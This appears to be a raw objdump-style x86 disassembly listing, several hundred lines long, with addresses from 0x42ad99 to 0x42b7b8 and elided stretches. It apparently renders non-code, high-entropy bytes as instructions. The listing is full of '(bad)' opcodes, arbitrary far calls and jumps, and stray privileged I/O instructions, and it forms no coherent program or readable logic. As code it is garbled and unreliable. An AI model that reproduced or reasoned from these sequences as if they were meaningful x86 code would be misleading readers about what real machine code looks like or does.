  42ad99:	and    ah,BYTE PTR ds:0x24b4cb65
  42ad9f:	inc    eax
  42ada0:	inc    esp
  42ada1:	cmp    eax,0x797a0a0f
  42ada6:	enter  0x4234,0xda
  42adaa:	stos   DWORD PTR es:[edi],eax
  42adab:	xor    DWORD PTR [edx+0x43],esi
  42adae:	imul   BYTE PTR [edx]
  42adb0:	jle    0x42ae05
  42adb2:	jl     0x42ad50
  42adb4:	lods   eax,DWORD PTR ds:[esi]
  42adb5:	jge    0x42ae34
  42adb7:	retf   
  42adb8:	rcl    DWORD PTR [edi],cl
  42adba:	cmc    
  42adbb:	push   esi
  42adbc:	cdq    
  42adbd:	shl    DWORD PTR [edx+0x33533459],0xb3
  42adc4:	dec    ebx
  42adc5:	mov    esp,0x4dc04a6
  42adca:	pop    esp
  42adcb:	cmp    BYTE PTR [edi],0x18
  42adce:	pop    ebp
  42adcf:	popa   
  42add0:	mov    cl,0xe0
  42add2:	push   ds
  42add3:	and    al,0x26
  42add5:	loop   0x42ad73
  42add7:	arpl   sp,ax
  42add9:	or     bl,ch
  42addb:	sub    DWORD PTR [eax],ebp
  42addd:	mov    esi,0x9bc61a50
  42ade2:	cmp    eax,0x58e6ae4a
  42ade7:	jg     0x42ada5
  42ade9:	daa    
  42adea:	popa   
  42adeb:	sbb    ch,bl
  42aded:	mov    edx,0x69284c8c
  42adf2:	dec    esp
  42adf3:	shl    ebp,cl
  42adf5:	jb     0x42ae73
  42adf7:	mov    ecx,0xb9c260b6
  42adfc:	test   eax,0x67d07219
  42ae01:	pushf  
  42ae02:	cmp    eax,0x4feb4adb
  42ae07:	test   eax,0xf7e66bd
  42ae0c:	inc    ebp
  42ae0d:	iret   
  42ae0e:	dec    esp
  42ae0f:	push   edi
	...
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	pop    edx
  42ae81:	out    dx,al
  42ae82:	lods   al,BYTE PTR ds:[esi]
  42ae83:	in     eax,0xb0
  42ae85:	retf   0x1
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	test   eax,0xcaf32c8
  42ae91:	dec    ecx
  42ae92:	push   edi
  42ae93:	(bad)  
  42ae94:	jns    0x42aebb
  42ae96:	dec    esp
  42ae97:	and    eax,0xcff8c81e
  42ae9c:	push   0xe5fdd2
  42aea1:	mov    ch,0x40
  42aea3:	sbb    BYTE PTR ds:0xcf4fb1e3,0x26
  42aeaa:	ror    BYTE PTR [edi],0x79
  42aead:	xchg   ebx,eax
  42aeae:	jno    0x42af0e
  42aeb0:	lea    ecx,[ecx-0x7e7ca013]
  42aeb6:	arpl   WORD PTR [edx+0x74],bx
  42aeb9:	jae    0x42aefc
  42aebb:	scas   eax,DWORD PTR es:[edi]
  42aebc:	fild   QWORD PTR [edi-0x12]
  42aebf:	gs adc eax,0x27f5d3d2
  42aec5:	add    DWORD PTR [esp+ebp*8],edi
  42aec8:	out    0xf5,eax
  42aeca:	push   esp
  42aecb:	inc    esi
  42aecc:	stc    
  42aecd:	adc    al,0xd0
  42aecf:	(bad)  
  42aed0:	cwde   
  42aed1:	daa    
  42aed2:	inc    ecx
  42aed3:	rol    ecx,1
  42aed5:	xor    BYTE PTR [ebp-0x1f694187],dl
  42aedb:	mov    ecx,0x16c1771a
  42aee0:	push   ebx
  42aee1:	cdq    
  42aee2:	cmp    ebp,DWORD PTR [ebp-0x3e2e5830]
  42aee8:	js     0x42aed4
  42aeea:	mov    BYTE PTR gs:[ebx+0x46ea93f4],ah
  42aef1:	push   ds
  42aef2:	fs push es
  42aef4:	call   0x145f:0x269421f1
  42aefb:	pop    ds
  42aefc:	adc    esp,DWORD PTR [ebp-0x76dcef76]
  42af02:	mov    ch,0xda
  42af04:	sub    DWORD PTR [ecx+0x5f],eax
  42af07:	std    
  42af08:	test   BYTE PTR [eax+0xa27d2ed],ah
  42af0e:	sar    edi,cl
  42af10:	scas   al,BYTE PTR es:[edi]
  42af11:	jle    0x42af20
  42af13:	and    BYTE PTR [edx+0x37],0x9d
  42af17:	imul   esi,DWORD PTR [ecx+0x5d],0x3f984d88
  42af1e:	test   BYTE PTR [esi+0x2d],dh
  42af21:	inc    edi
  42af22:	fisub  WORD PTR [esi-0x1a]
  42af25:	and    al,0x54
  42af27:	or     bh,ch
  42af29:	and    eax,0x26fb9beb
  42af2e:	ds and al,0xfb
  42af31:	out    dx,al
  42af32:	rcl    BYTE PTR [edx+ecx*1],1
  42af35:	lds    eax,FWORD PTR [eax+0x26]
  42af38:	or     esp,DWORD PTR [ebx]
  42af3a:	mov    al,0xdb
  42af3c:	lea    ebx,[edi+0x25e19b64]
  42af42:	mov    bl,0x39
  42af44:	test   DWORD PTR [ebx],0x957e5471
  42af4a:	clc    
  42af4b:	(bad)  
  42af4c:	icebp  
  42af4d:	cmp    al,0x87
  42af4f:	xor    al,0xc0
  42af51:	popa   
  42af52:	stos   BYTE PTR es:[edi],al
  42af53:	mov    eax,ds:0xc3ddf066
  42af58:	shl    eax,0x6e
  42af5b:	cmp    DWORD PTR ds:0xf5ef7639,0xffffffab
  42af62:	call   0x52825a50
  42af67:	cmp    DWORD PTR [esi],ebp
  42af69:	fdivr  QWORD PTR [eax-0x74efdd87]
  42af6f:	jle    0x42af50
  42af71:	pop    esp
  42af72:	(bad)  
  42af73:	fcom   QWORD PTR [esi-0x9a6efef]
  42af79:	sub    bl,BYTE PTR [ebp-0x2193f31e]
  42af7f:	mov    esp,0x8f5b6320
  42af84:	mov    BYTE PTR [eax],dl
  42af86:	jmp    0x4126:0x1c3c5040
  42af8d:	stos   BYTE PTR es:[edi],al
  42af8e:	or     eax,0x79
	...
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	cmp    bh,BYTE PTR [ebp-0x344bce1a]
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	arpl   WORD PTR [edx+eax*1-0x670b4e8d],sp
  42b013:	nop
  42b014:	pop    esi
  42b015:	frstor [edx+0x73745abc]
  42b01b:	fdiv   st(1),st
  42b01d:	mov    bl,0xde
  42b01f:	mov    BYTE PTR [eax+ebx*2-0x3a],bl
  42b023:	push   ebx
  42b024:	inc    esi
  42b025:	dec    edi
  42b026:	div    DWORD PTR [edi+0x2f]
  42b029:	xor    DWORD PTR [eax+ecx*8-0xd],0xad4a6721
  42b031:	ss push ebp
  42b033:	mov    ds:0x11ff70ca,al
  42b038:	ins    BYTE PTR es:[edi],dx
  42b039:	sti    
  42b03a:	pop    es
  42b03b:	push   esp
  42b03c:	mov    WORD PTR [ebx+0x37153452],cs
  42b042:	cmp    al,0xc2
  42b044:	ss clc 
  42b046:	xor    al,0xb8
  42b048:	retf   
  42b049:	test   al,0x4d
  42b04b:	lds    ebp,FWORD PTR [edx]
  42b04d:	adc    dl,BYTE PTR [ebp-0x4]
  42b050:	loop   0x42b07a
  42b052:	cmp    DWORD PTR [ecx+0x3],ebp
  42b055:	mov    dh,0xba
  42b057:	out    0xa6,eax
  42b059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b05a:	aad    0x34
  42b05c:	(bad)  
  42b05d:	cld    
  42b05e:	pop    edi
  42b05f:	sbb    BYTE PTR [ebx+0x3],ch
  42b062:	test   BYTE PTR [edx+0x4f],bl
  42b065:	mov    ah,0x73
  42b067:	gs pop edi
  42b069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b06a:	jl     0x42b030
  42b06c:	mov    bh,0x85
  42b06e:	jle    0x42b0eb
  42b070:	call   0x4082:0x3b6ca7ef
  42b077:	icebp  
  42b078:	mov    cl,al
  42b07a:	jle    0x42b00e
  42b07c:	xchg   esp,eax
  42b07d:	cmp    cl,cl
  42b07f:	xchg   ebx,eax
  42b080:	mov    ebp,0xb6bbfa19
  42b085:	mov    ds:0x7cd37886,al
  42b08a:	cmc    
  42b08b:	jecxz  0x42b012
  42b08d:	pop    es
  42b08e:	jge    0x42b08b
  42b090:	push   ebx
  42b091:	pop    ss
  42b092:	int3   
  42b093:	lods   al,BYTE PTR ds:[esi]
  42b094:	fld    QWORD PTR [esi+0x45]
  42b097:	test   BYTE PTR [ebp-0x4158160f],al
  42b09d:	test   al,0x50
  42b09f:	pushf  
  42b0a0:	adc    esp,0xffffffb5
  42b0a3:	sbb    cl,BYTE PTR [ecx+0x40]
  42b0a6:	push   ebx
  42b0a7:	je     0x42b08f
  42b0a9:	pop    edx
  42b0aa:	aaa    
  42b0ab:	jno    0x42b0c8
  42b0ad:	cli    
  42b0ae:	mov    bl,0xd9
  42b0b0:	icebp  
  42b0b1:	xchg   esp,eax
  42b0b2:	into   
  42b0b3:	aaa    
  42b0b4:	sub    BYTE PTR [edx],al
  42b0b6:	sbb    ecx,DWORD PTR ds:0xe6772b7b
  42b0bc:	lods   eax,DWORD PTR ds:[esi]
  42b0bd:	rcr    BYTE PTR [ecx+0x5],cl
  42b0c0:	ins    BYTE PTR es:[edi],dx
  42b0c1:	push   es
  42b0c2:	sbb    eax,0x36523b56
  42b0c7:	loope  0x42b04d
  42b0c9:	mov    bh,0x3d
  42b0cb:	jne    0x42b105
  42b0cd:	cmp    al,BYTE PTR [ebx-0x1a]
  42b0d0:	(bad)  
  42b0d2:	das    
  42b0d3:	mov    bh,0x11
  42b0d5:	(bad)  
  42b0d6:	sbb    ch,BYTE PTR [eax-0x6e96b525]
  42b0dc:	cmp    DWORD PTR [ebx-0x1a],eax
  42b0df:	dec    ecx
  42b0e0:	leave  
  42b0e1:	push   esp
  42b0e2:	lahf   
  42b0e3:	in     al,0xe3
  42b0e5:	jge    0x42b094
  42b0e7:	mov    al,ds:0x86cfd72f
  42b0ec:	test   DWORD PTR [esi-0x57e2b851],ebp
  42b0f2:	pop    esp
  42b0f3:	xlat   BYTE PTR ds:[ebx]
  42b0f4:	ja     0x42b0fc
  42b0f6:	(bad)  
  42b0f7:	sar    DWORD PTR [ecx+0x35ab00be],1
  42b0fd:	mov    ebx,0xbbb36ebc
  42b102:	clc    
  42b103:	call   0x25d7:0x1d10976d
  42b10a:	or     eax,0x84978cc3
  42b10f:	pop    esp
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	rcr    ebp,cl
  42b182:	in     eax,dx
  42b183:	cmp    DWORD PTR [eax+0x40001cc],edi
  42b189:	add    DWORD PTR [eax],eax
  42b18b:	add    ch,ah
  42b18d:	leave  
  42b18e:	xlat   BYTE PTR ds:[ebx]
  42b18f:	out    0xa8,al
  42b191:	lds    esp,FWORD PTR [esi+0x60]
  42b194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b195:	imul   esi,DWORD PTR [eax-0x1afc447b],0xffffffee
  42b19c:	dec    esi
  42b19d:	rcl    DWORD PTR [ebp-0x3294b6c4],1
  42b1a3:	fidiv  DWORD PTR [ebp+0x58]
  42b1a6:	cmp    al,0x96
  42b1a8:	mov    bh,0x8c
  42b1aa:	mov    ebx,ebx
  42b1ac:	jo     0x42b221
  42b1ae:	icebp  
  42b1af:	stc    
  42b1b0:	mov    bh,0xf3
  42b1b2:	cmp    eax,DWORD PTR [edi-0x18]
  42b1b5:	cmp    ah,BYTE PTR [edi-0x6e]
  42b1b8:	mov    esp,0x12bd01d1
  42b1bd:	mov    ch,BYTE PTR [ecx]
  42b1bf:	sti    
  42b1c0:	jnp    0x42b224
  42b1c2:	push   ss
  42b1c3:	inc    edi
  42b1c4:	pop    eax
  42b1c5:	adc    edx,ebx
  42b1c7:	push   cs
  42b1c8:	adc    cl,ah
  42b1ca:	cmp    cl,BYTE PTR [ecx]
  42b1cc:	fwait
  42b1cd:	xchg   esp,eax
  42b1ce:	and    al,0x33
  42b1d0:	cmp    al,0xed
  42b1d2:	pusha  
  42b1d3:	mov    eax,ds:0x75712f8c
  42b1d8:	pop    eax
  42b1d9:	add    al,0x83
  42b1db:	sub    eax,DWORD PTR [ebp-0x351ae9df]
  42b1e1:	xor    esi,DWORD PTR [eax]
  42b1e3:	lods   eax,DWORD PTR ds:[esi]
  42b1e4:	xchg   ecx,eax
  42b1e5:	mov    dh,0x69
  42b1e7:	xchg   ecx,eax
  42b1e8:	dec    edx
  42b1e9:	lahf   
  42b1ea:	xlat   BYTE PTR ds:[ebx]
  42b1eb:	sbb    DWORD PTR [eax],edi
  42b1ed:	lds    esi,FWORD PTR [edx+0x27]
  42b1f0:	xor    esi,edi
  42b1f2:	jns    0x42b235
  42b1f4:	sbb    bh,BYTE PTR [edi-0x29bcf70d]
  42b1fa:	jl     0x42b1cc
  42b1fc:	cli    
  42b1fd:	or     ebx,DWORD PTR [ebp-0x1df783dd]
  42b203:	inc    edi
  42b204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b205:	push   0x4b
  42b207:	fstp   TBYTE PTR [ebx]
  42b209:	fmul   DWORD PTR [ecx+0x26]
  42b20c:	lock mov ch,0xc2
  42b20f:	adc    al,0x19
  42b211:	push   0xffffff80
  42b213:	adc    DWORD PTR [eax+0xb],edx
  42b216:	stos   DWORD PTR es:[edi],eax
  42b217:	mov    ebp,0x3f2a2a3f
  42b21c:	ret    
  42b21d:	pop    edi
  42b21e:	push   edx
  42b21f:	add    DWORD PTR [esi-0x207fa4a9],esp
  42b225:	jp     0x42b1ff
  42b227:	xlat   BYTE PTR ds:[ebx]
  42b228:	adc    esp,DWORD PTR [edx]
  42b22a:	jnp    0x42b22c
  42b22c:	jo     0x42b26f
  42b22e:	sbb    eax,0x32e918c3
  42b233:	(bad)  
  42b234:	mov    eax,0xe18cef1c
  42b239:	xchg   ebp,eax
  42b23a:	xlat   BYTE PTR ds:[ebx]
  42b23c:	xor    eax,0x50dad9ef
  42b241:	ficom  DWORD PTR [esi-0x1979722]
  42b247:	or     BYTE PTR [esi],bl
  42b249:	mov    al,0xb8
  42b24b:	pop    ebp
  42b24c:	(bad)  
  42b24d:	fisttp DWORD PTR ds:0xd5214a7a
  42b253:	pop    eax
  42b254:	or     BYTE PTR [eax+0x29ba89a5],0xf1
  42b25b:	jno    0x42b258
  42b25d:	fistp  WORD PTR [ebx]
  42b25f:	(bad)  
  42b260:	cmp    DWORD PTR [ebx+0x59],ecx
  42b263:	je     0x42b23a
  42b265:	jmp    DWORD PTR [eax-0x67f63d76]
  42b26b:	cs (bad) 
  42b26d:	imul   eax,DWORD PTR [edi],0xa286e55a
  42b273:	sbb    ebx,edi
  42b275:	jl     0x42b209
  42b277:	call   0x841e:0xf5b40603
  42b27e:	mov    esp,0x725a7807
  42b283:	test   ah,dl
  42b285:	imul   edx,DWORD PTR [edi-0x356ee2a5],0x367b5a03
  42b28f:	fld    QWORD PTR [eax]
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0x46738e65
  42b301:	xchg   esp,eax
  42b302:	addr16 in eax,dx
  42b304:	mov    esp,0x40001cd
  42b309:	add    DWORD PTR [eax],eax
  42b30b:	add    BYTE PTR [eax-0xbdad0ff],dh
  42b311:	test   DWORD PTR [esi],edi
  42b313:	cmp    dh,dh
  42b315:	mov    eax,ds:0x8ecceedb
  42b31a:	sub    edi,eax
  42b31c:	inc    edx
  42b31d:	xchg   ecx,eax
  42b31e:	or     ah,ch
  42b320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b321:	cwde   
  42b322:	add    DWORD PTR [edx+0x77138240],edx
  42b328:	js     0x42b2f0
  42b32a:	xchg   DWORD PTR [eax],esp
  42b32c:	leave  
  42b32d:	inc    edx
  42b32e:	pop    edx
  42b32f:	rol    DWORD PTR [eax-0x43],cl
  42b332:	cmp    ebx,DWORD PTR [ecx]
  42b334:	aad    0x95
  42b336:	xlat   BYTE PTR ds:[ebx]
  42b337:	repz cmp esi,DWORD PTR [eax+0x21]
  42b33b:	or     ah,cl
  42b33d:	push   edi
  42b33e:	inc    edi
  42b33f:	jns    0x42b2ed
  42b341:	sub    DWORD PTR [esp+eiz*4-0x21d6ac1f],eax
  42b348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b349:	sub    al,0xd4
  42b34b:	xchg   edi,eax
  42b34c:	or     eax,0xd9b295c5
  42b351:	jo     0x42b2e3
  42b353:	or     eax,0x159bcbc3
  42b358:	ror    DWORD PTR [eax+0x33cf32e5],0x61
  42b35f:	jle    0x42b2fb
  42b361:	push   0xffffffa3
  42b363:	imul   eax,DWORD PTR [ebx-0x4b946cc9],0x6bfabb73
  42b36d:	or     ecx,ebx
  42b36f:	sar    DWORD PTR [esi+ebp*8-0xf],0xbe
  42b374:	into   
  42b375:	mov    ebx,0xdcf84f1a
  42b37a:	jno    0x42b38a
  42b37c:	call   0xe331:0x7193a4eb
  42b383:	push   ebp
  42b384:	out    0xb3,al
  42b386:	pop    ds
  42b387:	sub    DWORD PTR [ebp+0x68],esp
  42b38a:	inc    edi
  42b38b:	loope  0x42b387
  42b38d:	xchg   ecx,eax
  42b38e:	or     DWORD PTR [ebx+0x16],ebx
  42b391:	es pop ebp
  42b393:	pop    ebx
  42b394:	xchg   edx,eax
  42b395:	mov    ch,0xd7
  42b397:	jbe    0x42b3f6
  42b399:	repz pop ds
  42b39b:	stos   BYTE PTR es:[edi],al
  42b39c:	jno    0x42b37a
  42b39e:	ja     0x42b348
  42b3a0:	cmp    edx,ebp
  42b3a2:	push   0xef598686
  42b3a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b3a8:	sub    al,0xe8
  42b3aa:	lahf   
  42b3ab:	jb     0x42b3da
  42b3ad:	hlt    
  42b3ae:	xor    eax,0x6aad836
  42b3b3:	fistp  DWORD PTR [eax-0x6e3c82ca]
  42b3b9:	mov    eax,0xe8e9dca
  42b3be:	idiv   BYTE PTR [eax-0x5]
  42b3c1:	xor    al,0x89
  42b3c3:	iret   
  42b3c4:	xor    dl,BYTE PTR [ebp+0x5d]
  42b3c7:	into   
  42b3c8:	scas   al,BYTE PTR es:[edi]
  42b3c9:	mov    ss,WORD PTR [edx-0x20]
  42b3cc:	xor    BYTE PTR [ebx+eax*4],dl
  42b3cf:	jnp    0x42b38f
  42b3d1:	or     WORD PTR [ebx-0x1ffebe5f],ax
  42b3d8:	mov    ah,0xc9
  42b3da:	xchg   ebx,eax
  42b3db:	mov    ecx,0x5d2deca0
  42b3e0:	scas   al,BYTE PTR es:[edi]
  42b3e1:	lods   al,BYTE PTR ds:[esi]
  42b3e2:	cmc    
  42b3e3:	aad    0x82
  42b3e5:	jmp    0x1720131a
  42b3ea:	mov    ecx,0x8ddba8a4
  42b3ef:	sbb    eax,0xec978e05
  42b3f4:	push   ebx
  42b3f5:	push   ecx
  42b3f6:	mov    ebx,0x479f6e61
  42b3fb:	clc    
  42b3fc:	inc    eax
  42b3fd:	push   esi
  42b3fe:	ins    BYTE PTR es:[edi],dx
  42b3ff:	out    dx,al
  42b400:	sub    BYTE PTR [edx-0x38],al
  42b403:	mov    ds:0x566072b2,al
  42b408:	icebp  
  42b409:	stc    
  42b40a:	dec    ecx
  42b40b:	sahf   
  42b40c:	xchg   ecx,eax
  42b40d:	mov    ecx,0x1632
	...
  42b472:	add    BYTE PTR [eax],al
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [ecx+0x55],eax
  42b482:	imul   ecx,DWORD PTR [edi+0x1cec0],0x4
  42b489:	add    DWORD PTR [eax],eax
  42b48b:	add    BYTE PTR [ecx+ecx*8],dl
  42b48e:	in     al,0x99
  42b490:	and    eax,0x3b09202c
  42b495:	loopne 0x42b4f6
  42b497:	pusha  
  42b498:	cwde   
  42b499:	int3   
  42b49a:	push   edx
  42b49b:	es popa 
  42b49d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b49e:	dec    ebx
  42b49f:	push   edi
  42b4a0:	sub    edx,DWORD PTR [esi]
  42b4a2:	mov    ch,0x33
  42b4a4:	loope  0x42b475
  42b4a6:	scas   eax,DWORD PTR es:[edi]
  42b4a7:	leave  
  42b4a8:	(bad)  
  42b4a9:	call   0x9d6e:0x640425a9
  42b4b0:	and    ah,BYTE PTR [ebx+0x61]
  42b4b3:	xchg   esi,eax
  42b4b4:	iret   
  42b4b5:	loop   0x42b50a
  42b4b7:	mov    esi,0xe5804a7e
  42b4bc:	or     ah,BYTE PTR [ebx]
  42b4be:	sub    eax,eax
  42b4c0:	push   esi
  42b4c1:	push   0xffffffd6
  42b4c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4c4:	xor    DWORD PTR [esi+eax*1-0x4dc7814b],eax
  42b4cb:	jmp    0x473e4a88
  42b4d0:	iret   
  42b4d1:	mov    bl,0xe
  42b4d3:	mov    ecx,0x6d25ba07
  42b4d8:	ret    
  42b4d9:	push   ds
  42b4da:	out    0x14,al
  42b4dc:	mov    eax,0x98821aa5
  42b4e1:	retf   0xce57
  42b4e4:	sbb    eax,DWORD PTR [edx-0x764fd5dd]
  42b4ea:	psllw  mm3,QWORD PTR [ecx+0x50c52809]
  42b4f1:	fwait
  42b4f2:	jae    0x42b4cc
  42b4f4:	ficomp DWORD PTR [edx-0x3359da51]
  42b4fa:	repz cmp ch,bl
  42b4fd:	inc    esp
  42b4fe:	mov    al,ds:0xcb5ed407
  42b503:	and    al,0xe
  42b505:	or     DWORD PTR [edx+0x1b],edx
  42b508:	ret    0x4166
  42b50b:	out    dx,eax
  42b50c:	xchg   edx,eax
  42b50d:	push   ss
  42b50e:	sbb    al,0x64
  42b510:	sbb    BYTE PTR [ebx-0x2ad42e97],0x97
  42b517:	ret    
  42b518:	jns    0x42b4e1
  42b51a:	sbb    DWORD PTR [ebp-0x31],edi
  42b51d:	pop    ebx
  42b51e:	clc    
  42b51f:	add    al,0x5e
  42b521:	fs add bh,ch
  42b524:	mov    ecx,0xcc2473c9
  42b529:	aad    0x29
  42b52b:	(bad)  
  42b52c:	and    al,0xd7
  42b52e:	gs in  al,0x7c
  42b531:	adc    DWORD PTR [ecx],edx
  42b533:	(bad)  
  42b534:	xchg   ebp,eax
  42b535:	retf   0x7117
  42b538:	or     al,0x6b
  42b53a:	adc    DWORD PTR [ebx-0x6f6cae90],esi
  42b540:	sbb    BYTE PTR [ebp-0x1c1a4199],ch
  42b546:	xor    eax,0xbe48ac
  42b54b:	ins    DWORD PTR es:[edi],dx
  42b54c:	or     eax,DWORD PTR [eax]
  42b54e:	mov    ch,BYTE PTR [edx-0x239f47ed]
  42b554:	add    ch,cl
  42b556:	mov    esi,0x665028ca
  42b55b:	out    0x3c,eax
  42b55d:	pop    edi
  42b55e:	sbb    ecx,edx
  42b560:	ss jae 0x42b5b7
  42b563:	stos   BYTE PTR es:[edi],al
  42b564:	xchg   DWORD PTR [edi],edi
  42b566:	add    DWORD PTR [eax],ebx
  42b568:	call   0xe822:0x4f6eec19
  42b56f:	jns    0x42b5ac
  42b571:	mov    ds:0x226ab374,al
  42b576:	xor    eax,DWORD PTR [ebx]
  42b578:	or     ah,cl
  42b57a:	jmp    0x96cad9b6
  42b57f:	int3   
  42b580:	out    dx,al
  42b581:	into   
  42b582:	lods   al,BYTE PTR ds:[esi]
  42b583:	mov    ah,0xf
  42b585:	test   al,0xb0
  42b587:	jge    0x42b5cd
  42b589:	push   esi
  42b58a:	test   bl,bh
  42b58c:	fnstsw WORD PTR [ebp+edi*8-0x3e]
	...
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	dec    ecx
  42b601:	cdq    
  42b602:	mov    cl,0xf1
  42b604:	(bad)  
  42b605:	iret   
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    al,0x1
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	push   0xf968fe9
  42b611:	dec    ebp
  42b612:	lods   al,BYTE PTR ds:[esi]
  42b613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b614:	in     eax,0xc2
  42b616:	push   ebp
  42b617:	in     eax,0x26
  42b619:	push   edi
  42b61a:	inc    edi
  42b61b:	in     al,0x81
  42b61d:	pop    ss
  42b61e:	dec    edi
  42b61f:	mov    esp,0x659f4b5d
  42b624:	call   0xdd17:0x3091852d
  42b62b:	das    
  42b62c:	add    BYTE PTR [ecx+0x367bc302],ah
  42b632:	ins    DWORD PTR es:[edi],dx
  42b633:	push   0xa601720c
  42b638:	test   BYTE PTR [edi+0x608e65c2],al
  42b63e:	clc    
  42b63f:	xor    ebp,DWORD PTR [esi]
  42b641:	mov    esp,esi
  42b643:	fnstenv [esi+eiz*8+0x6f]
  42b647:	ror    cl,0x71
  42b64a:	push   edx
  42b64b:	test   eax,0xd869a8d
  42b650:	ja     0x42b66c
  42b652:	imul   ebx,edi,0xdf0b2360
  42b658:	sub    ah,BYTE PTR [edi+ebp*2-0x6e]
  42b65c:	jb     0x42b689
  42b65e:	push   cs
  42b65f:	lahf   
  42b660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b661:	cmp    dl,BYTE PTR [ecx+0x3a]
  42b664:	push   ebp
  42b665:	sub    DWORD PTR [edx-0x76df9f17],ebx
  42b66b:	cld    
  42b66c:	inc    esp
  42b66d:	xchg   esi,eax
  42b66e:	push   ebp
  42b66f:	or     eax,0xf0522134
  42b674:	mov    WORD PTR [esi],?
  42b676:	mov    esi,0x1d1381cd
  42b67b:	nop
  42b67c:	cmp    ebp,DWORD PTR [bx+0x28]
  42b680:	in     eax,dx
  42b681:	into   
  42b682:	loop   0x42b6dd
  42b684:	push   ss
  42b685:	sub    al,0x4e
  42b687:	out    dx,eax
  42b688:	or     eax,0x1201d7b5
  42b68d:	xor    BYTE PTR [edx-0x1d],ch
  42b690:	outs   dx,BYTE PTR ds:[esi]
  42b691:	imul   eax,esp,0x40a39558
  42b697:	dec    esp
  42b698:	dec    esi
  42b699:	in     al,dx
  42b69a:	call   0xf7fa:0xe94924a2
  42b6a1:	std    
  42b6a2:	cmp    DWORD PTR [ebx*8-0x19e6f8c6],0x6f166abc
  42b6ad:	mov    al,0x14
  42b6af:	repnz add edi,ebx
  42b6b2:	mov    edx,0xeb213614
  42b6b7:	in     al,dx
  42b6b8:	dec    ebp
  42b6b9:	add    ebx,DWORD PTR [edx]
  42b6bb:	lahf   
  42b6bc:	lds    edx,FWORD PTR [ebx]
  42b6be:	push   ss
  42b6bf:	nop
  42b6c0:	or     BYTE PTR [ebx],al
  42b6c2:	push   es
  42b6c3:	pop    es
  42b6c4:	adc    DWORD PTR [edx],ebx
  42b6c6:	(bad)  
  42b6c7:	mov    al,0x25
  42b6c9:	mov    DWORD PTR [ebx+ecx*8],edi
  42b6cc:	rcl    dl,cl
  42b6ce:	sbb    eax,0xfe35fa8
  42b6d3:	jle    0x42b6d4
  42b6d5:	jb     0x42b723
  42b6d7:	xchg   edx,eax
  42b6d8:	hlt    
  42b6d9:	and    eax,0x3fa34927
  42b6de:	push   0x37
  42b6e0:	aas    
  42b6e1:	mov    esp,0x1373d344
  42b6e6:	jo     0x42b684
  42b6e8:	inc    ebp
  42b6e9:	adc    eax,DWORD PTR [eax-0x3c]
  42b6ec:	or     BYTE PTR [ebx-0x38933580],al
  42b6f2:	dec    ecx
  42b6f3:	repnz pushf 
  42b6f5:	pop    ds
  42b6f6:	daa    
  42b6f7:	in     eax,0xa6
  42b6f9:	xor    DWORD PTR [eax-0x76],esp
  42b6fc:	sub    eax,edi
  42b6fe:	adc    ecx,DWORD PTR [ebx]
  42b700:	aad    0xc4
  42b702:	std    
  42b703:	add    al,0xea
  42b705:	pop    ss
  42b706:	xchg   ebx,eax
  42b707:	into   
  42b708:	mov    ecx,0xee7f430d
  42b70d:	or     BYTE PTR [esi+0x64],bl
	...
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	iret   
  42b781:	add    ecx,DWORD PTR [edx+0x38]
  42b784:	enter  0x1d0,0x0
  42b788:	add    al,0x1
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	sub    al,0x9e
  42b78e:	pop    eax
  42b78f:	dec    ebx
  42b790:	sub    al,0xcc
  42b792:	sub    eax,0x78ba4e33
  42b797:	jle    0x42b79b
  42b799:	scas   al,BYTE PTR es:[edi]
  42b79a:	in     al,0xe2
  42b79c:	adc    BYTE PTR [ebx-0x5d4666e7],bh
  42b7a2:	cmp    al,0x1c
  42b7a4:	out    0x22,al
  42b7a6:	test   DWORD PTR cs:[ecx],eax
  42b7a9:	out    0xa2,al
  42b7ab:	or     DWORD PTR [ebx+0x6d],esi
  42b7ae:	loope  0x42b7c6
  42b7b0:	mov    dl,0x10
  42b7b2:	pop    es
  42b7b3:	ror    DWORD PTR [ebp+ebx*4-0x75],0x83
  42b7b8:	jmp    0x5ad7:0x44148f35
